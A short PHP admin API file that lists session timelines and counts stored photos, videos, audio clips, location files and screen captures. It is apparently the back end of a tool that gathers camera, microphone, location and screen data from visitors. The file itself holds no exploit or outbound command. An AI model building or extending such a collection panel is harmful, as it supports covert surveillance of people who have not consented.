<?php
// session_api.php — Returns session data for admin AJAX
session_start();
if (empty($_SESSION['auth'])) { http_response_code(403); exit(); }

$action = $_GET['action'] ?? '';
$uuid   = preg_replace('/[^a-f0-9\-]/', '', $_GET['uuid'] ?? '');

header('Content-Type: application/json');

if ($action === 'list') {
    $sessions = [];
    $sess_dir = __DIR__ . '/logs/sessions';
    if (is_dir($sess_dir)) {
        foreach (glob($sess_dir . '/*', GLOB_ONLYDIR) as $sdir) {
            $u  = basename($sdir);
            $tl = file_exists($sdir . '/timeline.log') ? file_get_contents($sdir . '/timeline.log') : '';
            $sessions[] = ['uuid' => $u, 'events' => substr_count($tl, "\n"), 'last' => trim(end(array_filter(explode("\n", $tl))))];
        }
    }
    echo json_encode(['sessions' => $sessions]);
}

elseif ($action === 'timeline' && $uuid) {
    $f = __DIR__ . '/logs/sessions/' . $uuid . '/timeline.log';
    echo json_encode(['uuid' => $uuid, 'timeline' => file_exists($f) ? file_get_contents($f) : '']);
}

elseif ($action === 'counts') {
    echo json_encode([
        'photos'    => count(glob(__DIR__ . '/logs/snapshots/*.jpg') ?: []),
        'videos'    => count(glob(__DIR__ . '/logs/snapshots/*.webm') ?: []),
        'audio'     => count(glob(__DIR__ . '/logs/audio/*.webm') ?: []),
        'locations' => count(glob(__DIR__ . '/logs/location/location_*.txt') ?: []),
        'screens'   => count(glob(__DIR__ . '/logs/screens/*.png') ?: []),
        'sessions'  => count(glob(__DIR__ . '/logs/sessions/*', GLOB_ONLYDIR) ?: []),
        'ts'        => date('H:i:s'),
    ]);
}

else {
    http_response_code(400);
    echo json_encode(['error' => 'Unknown action']);
}
exit();
